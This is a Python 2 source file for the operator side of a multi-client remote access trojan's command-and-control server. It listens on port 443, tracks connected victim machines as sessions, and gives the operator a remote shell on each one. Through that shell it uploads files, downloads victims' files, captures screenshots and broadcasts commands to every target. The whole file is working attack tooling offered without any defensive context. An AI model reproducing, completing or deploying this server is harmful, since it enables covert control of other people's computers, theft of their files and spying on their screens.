#!/usr/bin/env python

import socket
import json
import os
import base64
import threading

count = 0

def reliable_send_all(connection2, data):
    json_data = json.dumps(data)
    connection2.send(json_data)

def reliable_receive_all(connection2):
    json_data = ""
    while True:
        try:
            json_data = json_data + connection2.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue

def exe_remote_all(target,command):
    reliable_send_all(target,command)
    return reliable_receive_all(target)

def run(connection, address):
    def reliable_send(data):
        json_data = json.dumps(data)
        connection.send(json_data)

    def reliable_receive():
        json_data = ""
        while True:
            try:
                json_data = json_data + connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exe_remote(command):
        reliable_send(command)
        return reliable_receive()

    def write_files(path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def write_sc(path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Screenshot successful"

    def read_file(path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    while True:
        command = raw_input("* Shell#~%s: " % str(address))
        command = command.split(" ")
        try:
            if command[0] == "q":
                break
            if command[0] == "exit": #works, type targets for any connections AFTER this command
                print("Removing socket object. Connection will be closed")
                connection.close()
                targets.remove(connection)
                ips.remove(address)
                break
            if command[0] == "upload":
                file_content = read_file(command[1])
                command.append(file_content)
                #  ["upload", "sample.txt", "content of the file"]
            result = exe_remote(command)
            if command[0] == "download" and "[-] Error " not in result:
                result = write_files(command[1], result)
            if command[0] == "screenshot" and "[!!] " not in result:
                global count
                result = write_sc("screenshot%d" % count, result)
                count += 1
        except:
            result = "[-] Error during command execution"
        print(result)

def server():
    global clients
    #global connection, address # target, ip
    while True:
        if stop_thread:
            break
        listener.settimeout(2)
        try:
            connection, address = listener.accept()
            if address in ips:
                pass
            else:
                targets.append(connection)
                ips.append(address)
                print(str(targets[clients]) + " --- " + str(ips[clients]) + " has connected")
                clients += 1
        except:
            pass

ips = []
targets = []
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("10.0.2.9",443))
listener.listen(5)
print("Waiting for connection")
clients = 0
stop_thread = False

print("[+] Waiting for connections")
t1 = threading.Thread(target=server)
t1.start()

while True:
    command = raw_input("Center: ")
    command = command.split(" ")
    if command[0] == "targets":
        count2 = 0
        if len(ips) == 0:
            print("[-] No connections yet")
        else:
            for ip in ips:
                print("Session " + str(count2) + " .<------> " + str(ip))
                count2 +=1
    elif command[0] == "session":
        try:
            num = int(command[1])
            target_num = targets[num]
            target_ip = ips[num]
            run(target_num,target_ip)
        except:
            print("no session under that number")
    elif command[0] == 'exit': #works
        print("Closing all connections")
        for target in targets:
            target.close()
        listener.close()
        stop_thread = True
        t1.join()
        break
    elif command[0] == "sendall": #works!
        length_of_targets = len(targets)
        i = 0
        try:
            while i < length_of_targets:
                target_num = targets[i]
                print(target_num)
                sendall_result = exe_remote_all(target_num,command)
                print(sendall_result)
                i += 1
        except:
            print("[!!] Failed to send to all targets")
    elif command[0] == "holdall": #NW -> seems like it is sending the signal, but not exiting
        num_of_targets = len(targets)
        t = 0
        try:
            while t < num_of_targets:
                target_num = targets[t]
                print("[+] Attempting to send signal")
                result = "KeyboardInterrupt"
                reliable_send_all(target_num,result)
                print("[+] Signals sent!")
                t += 1
                
        except:
            print("[!!] Hold all connections failed")
        else:
            stop_thread = True
            t1.join()
            break
    else:
        print("[!!] Command doesn't exist")



